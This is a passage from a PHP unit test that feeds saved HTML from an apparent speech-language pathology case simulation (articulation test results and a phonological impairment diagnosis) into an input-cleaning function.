KLPA Test Results revealed the following percentages of occurrence for the following phonological processes - Reduction Processes: Deletion of Final Consonants: 25%, Syllable Reduction: 4%, Stopping of Fricatives and Affricates: 39%. Cluster Simplification: 46%, Liquid Simplification: 29%; Place and Manner Processes: Velar Fronting: 26%, Palatal Fronting: 33%, Deaffrication, 33%; Voicing Processe: Initial Voicing: 35%, Final Devoicing, 3%.</div></div></li><li class="clipboard-entry " data-entry-map-id="1" data-entry-content="Clinical Assessment of Articulation and Phonology-2nd Ed."><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:44:53 AM</span> &nbsp;Clinical Assessment of Articulation and Phonology-2nd Ed.</div><div class="effect">Results: Standard Score: &lt;55 Percentile: 1  Notes: Substitutions and omissions of speech sounds were noted in the initial and final position of words and blends.  Specific errors in the initial position of words included substitution of /b/ for /p/, /d/ for /k/, /d/ for /g/, /ʃ/ for /tʃ/, /w/ for /r/, /b/ for /v/, /d/ for /s/, /d/ for /z/, /f/ for /θ/, and /d/ for /ð/.  Omission of /h/ also occurred in the initial position of words.  Specific errors in the final position of words included substitution of /t/ for /s/ and /v/ for /ð/.  Omission of /v/ and / ʃ/ also occurred in the final position of words.
The following errors were noted for cluster words: substitution of /n/ for /kl/, /l/ for /fl/, /l/ for /gl/, /d/ for /sk/, /l/ for /sw/, /b/ for /br/ and /d/ for /tr/.
Production of multisyllabic words was also assessed on the CAAP.  Speech errors included substitutions, omissions and distortions of various speech sounds; specifically, substitution of /d/ for /k/and /d/ for /gr/ in the initial position of words, and deletion of /f/and /h/ in the initial position of words.  Substitutions of /w/ for /l/ /t/ for /nt/ occurred in the final position of words.
A summary of phonological processes on the CAAP indicated that the following processes are still present even though they are no longer appropriate for the child’s chronological age:  cluster reduction, stopping, and prevocalic voicing.</div></div></li></ul></div></li><li class="clipboard-category   " data-category-id="2" data-category-title="Redirect #1"><div class="clipboard-category-header-container"><h3 class="clipboard-category-header">Redirect #1</h3></div><div class="clipboard-category-content   "><ul class="clipboard-entries"><li class="clipboard-entry " data-entry-map-id="0" data-entry-content="Redirect #1"><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:44:53 AM</span> &nbsp;Redirect #1</div><div class="effect">Avoid selecting multiple assessments to evaluate the same topic area. </div></div></li></ul></div></li><li class="clipboard-category   " data-category-id="3" data-category-title="Oral Peripheral"><div class="clipboard-category-header-container"><h3 class="clipboard-category-header">Oral Peripheral</h3></div><div class="clipboard-category-content   "><ul class="clipboard-entries"><li class="clipboard-entry " data-entry-map-id="0" data-entry-content="Oral Mech-Pediatric"><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:45:32 AM</span> &nbsp;Oral Mech-Pediatric</div><div class="effect">This assessment is user driven, edit this field with your results.</div></div></li></ul></div></li><li class="clipboard-category   " data-category-id="4" data-category-title="Social and Emotional"><div class="clipboard-category-header-container"><h3 class="clipboard-category-header">Social and Emotional</h3></div><div class="clipboard-category-content   "><ul class="clipboard-entries"><li class="clipboard-entry " data-entry-map-id="0" data-entry-content="Play Observation"><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:47:07 AM</span> &nbsp;Play Observation</div><div class="effect">This assessment is user driven, edit this field with your results.</div></div></li></ul></div></li></ul></div></li><li class="clipboard-section diagnosis  " data-section-id="diagnosis"><div class="clipboard-section-header-container"><h2 class="clipboard-section-header"><span class="clipboard-section-icon"></span>Diagnosis</h2></div><div class="clipboard-section-content "><ul class="clipboard-categories"><li class="clipboard-category   " data-category-id="1" data-category-title="Articulation/ Phonology/ Speech Disorders"><div class="clipboard-category-header-container"><h3 class="clipboard-category-header">Articulation/ Phonology/ Speech Disorders</h3></div><div class="clipboard-category-content   "><ul class="clipboard-diagnosis-entries"><li class="clipboard-entry " data-entry-map-id="0" data-entry-content="Phonological Impairment"><div class="clipboard-entry-header-container"><span class="clipboard-entry-time">12:48:00 AM</span>&nbsp;<span class="clipboard-entry-name">Phonological Impairment</span></div></li></ul></div></li></ul></div></li></ul></div>
EOT;
		$data = [
			'html' => $html,
			'savedGameId' => '545aa00c-5a14-4f99-ba6a-4a560ad18582',
			'caseId' => 1,
			'mode' => 'learning',
		];
		$result = InputClean::all($data);
		debug($result);
	}

}

